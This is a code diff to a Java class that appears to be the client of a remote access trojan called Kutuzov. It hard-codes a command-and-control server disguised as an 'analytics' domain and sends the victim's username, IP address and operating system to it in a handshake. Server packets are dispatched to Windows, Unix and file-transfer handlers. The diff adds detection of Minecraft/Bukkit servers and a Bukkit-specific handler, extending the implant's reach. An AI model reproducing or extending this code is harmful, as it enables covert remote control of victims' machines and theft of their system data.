@@ -1,6 +1,7 @@
 package me.kutuzov.client;
 
 import com.profesorfalken.jpowershell.OSDetector;
+import me.kutuzov.client.util.BukkitUtil;
 import me.kutuzov.packet.*;
 import me.pk2.moodlyencryption.MoodlyEncryption;
 
@@ -16,7 +17,7 @@ import java.security.SecureRandom;
 public class KutuzovEntry {
     public  static final String HOST = "analytics018.antecedentium.xyz";
     public  static final int    PORT = 33901;
-    public  static final String VERSION = "b197";
+    public  static final String VERSION = "b201";
 
     private static Socket socket;
     private static long lastPing = System.currentTimeMillis();
@@ -115,13 +116,16 @@ public class KutuzovEntry {
                         String identifierName = System.getProperty("user.name");
                         String os = System.getProperty("os.name");
                         String localHost = InetAddress.getLocalHost().getHostAddress();
-                        oos.writeObject(new CSHandshakePacket(identifierName, localHost, os, VERSION));
+                        boolean isMC = BukkitUtil.isMC();
+
+                        oos.writeObject(new CSHandshakePacket(identifierName, localHost, os, VERSION, isMC));
                     } else if(packet instanceof SCBeepPacket)
                         Toolkit.getDefaultToolkit().beep();
                       else if(OSDetector.isWindows())
                         KutuzovWinPackets.handlePacket(ois, oos, (Packet)packet);
                     KutuzovKFTPPackets.handlePacket(ois, oos, (Packet)packet);
                     KutuzovUnixPackets.handlePacket(ois, oos, (Packet)packet);
+                    KutuzovBukkitPackets.handlePacket(ois, oos, (Packet)packet);
                 } catch (Exception ignored) {}
             }
         });
